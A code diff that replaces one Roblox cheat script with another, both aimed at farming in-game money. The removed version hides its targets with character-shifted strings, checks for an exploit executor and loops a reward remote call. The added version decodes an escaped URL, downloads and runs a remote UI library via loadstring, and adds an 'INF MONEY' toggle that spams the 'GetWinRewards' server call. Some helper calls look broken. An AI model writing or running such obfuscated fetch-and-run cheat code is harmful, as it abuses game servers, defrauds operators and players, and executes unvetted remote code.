@@ -1,20 +1,53 @@
 pcall(function()
-    local ζ = function(σ)local τ,ρ,χ="",math.random(90,130)for υ=1,#σ do local ω=σ:byte(υ)τ=τ..string.char(bit32.bxor(ω,ρ))ρ=(ρ+ω)%256 end return τ end
-    local η = { "JmjnbufeTupsbhf", "Sfnpuft", "SfnpufGvodujpot", "HfuXjoSfxbset", "SfqmjdbufeTupsbhf" }
-    local α,β,γ = game:GetService, ζ, loadstring
-    local θ = α(β(η[5]))
-    local μ = θ:FindFirstChild(β(η[2]))
-    local ν = μ and μ:FindFirstChild(β(η[3]))
-    local ξ = ν and ν:FindFirstChild(β(η[4]))
-    local ε = function()return typeof(debug)=="table" and not not getexecutorname end
-    if not ξ or not ε() then while true do end end
-    local ω = {
-        β(η[5]),
-        (function()return β(η[2])end)(),
-        (function(x)return x(η[3])end)(β),
-        select(1, β(η[4]))
-    }
-    local ρ = "game:GetService(\"%s\"):FindFirstChild(\"%s\"):FindFirstChild(\"%s\"):FindFirstChild(\"%s\"):InvokeServer()"
-    local π = ("pcall(function()while true do pcall(function()"..ρ.." end)end end)")
-    γ(π:format(unpack(ω)))()
+local _____=loadstring
+local ___=game:GetService;local ______=___("ReplicatedStorage")
+local function __________(____)return ____["WaitForChild"](____)end
+local function ________()return ______ end
+local ___________=loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\115\105\114\105\117\115\46\109\101\110\117\47\114\97\121\102\105\101\108\100"))()
+
+local function ____GIGADEWA()
+    return ___________:CreateWindow({
+        Name="\226\154\129 1+ Speed | Flash InfMoney",
+        LoadingTitle="Memuat Flash Speed...",
+        LoadingSubtitle="by bujang gila",
+        ConfigurationSaving={Enabled=false},
+        Discord={Enabled=false},
+        KeySystem=false
+    })
+end
+
+local function ______BUATDEWA(_)
+    return _:CreateTab("\226\154\129 Gila Duit", 4483362458)
+end
+
+local function ________FLASH(_,_F)
+    local ________FLAG=false
+    return _:CreateToggle({
+        Name="FLASH INF MONEY GILA \226\152\160",
+        CurrentValue=false,
+        Flag="xFlashInfToggle",
+        Callback=function(_ON)
+            ________FLAG=_ON
+            if _ON then
+                task.spawn(function()
+                    while ________FLAG do
+                        pcall(function()
+                            local ___r=__________(__________("Remotes"))
+                            local ___f=__________(__________(___r,"RemoteFunctions"))
+                            local _gi=__________(__________(___f,"GetWinRewards"))
+                            _gi:InvokeServer()
+                        end)
+                    end
+                end)
+            else
+                ________FLAG=false
+            end
+        end
+    })
+end
+
+local _W=____GIGADEWA()
+local _T=______BUATDEWA(_W)
+________FLASH(_T)
+
 end)
